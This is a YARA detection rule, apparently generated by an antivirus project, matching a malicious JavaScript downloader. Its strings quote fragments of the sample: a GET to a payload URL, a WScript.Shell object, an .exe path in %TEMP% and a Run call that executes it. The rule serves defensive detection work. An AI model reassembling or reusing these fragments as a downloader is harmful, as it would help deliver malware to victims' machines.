rule sig_20160330_7b245543cd4f262afaaafb81c4b7e4e2 {
  meta:
    description = "datamaliciousorder - file 20160330_7b245543cd4f262afaaafb81c4b7e4e2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "37503986537802c6fce9cf9b48a7c1bd632304c49a14b8018e85b3223e6417d9"

  strings:
    $s1  = "PJ[J](\"GET\", \"http://beimeihuifu.com/n7dja\", false);" fullword ascii
    $s2  = "var R = function YG() {return WScript[NW](\"WScript\"+\".Shell\");}(), X = 11;" fullword ascii
    $s3  = "function AJ(R0, NR){CJ = CJ * 1; return R0 - NR;};" fullword ascii
    $s4  = "if (PJ[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function DL() {return R[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"ivD3cgvcph.ex\" + \"e\";};" fullword ascii
    $s6  = "function Y(){return KT + \"\";};" fullword ascii
    $s7  = "function I() {return ((O == true) && (O == OB)) ? 1 : CJ;};" fullword ascii
    $s8  = "function CV(H0){R[\"Run\"](H0, CJ, CJ);};" fullword ascii
    $s9  = "function H(){return 22;};" fullword ascii
    $s10 = "}while (LS);" fullword ascii
    $s11 = "function MD(){return NW;};" fullword ascii
    $s12 = "function RO(QL) {var SX = (1, 2, 3, 4, 5, QL); return SX;};" fullword ascii
    $s13 = "function GI()" fullword ascii
    $s14 = "return AJ(FH, F);" fullword ascii
    $s15 = "var WS = new this[\"Date\"]();" fullword ascii
    $s16 = "var O = false;" fullword ascii
    $s17 = "O = true; " fullword ascii
    $s18 = "OB = true; " fullword ascii
    $s19 = "var OB = false;" fullword ascii
    $s20 = "var YG0 = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}